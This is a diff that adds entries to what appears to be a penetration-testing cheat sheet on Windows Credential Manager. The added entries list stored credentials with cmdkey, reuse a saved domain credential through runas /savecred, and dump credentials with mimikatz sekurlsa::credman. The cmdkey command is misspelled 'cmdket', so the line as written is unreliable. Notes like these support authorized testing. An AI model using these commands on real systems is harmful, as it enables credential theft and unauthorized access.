@@ -88,6 +88,15 @@ Sometimes, credentials are stored in Windows Credential Manager, we can enumerat
 
 Revealing credential:
 ```
-
+cmdket /list
+#if in the result we noticed a domain password
+runas /savecred /user:<domain\username> <programtorun>
+Ex: runas /savecred /user:<DC01\cmason> cmd
 ```
 
+Using mimikatz to reveal credentials:
+```
+mimikatz.exe
+privilege::debug
+sekurlsa::credman
+```
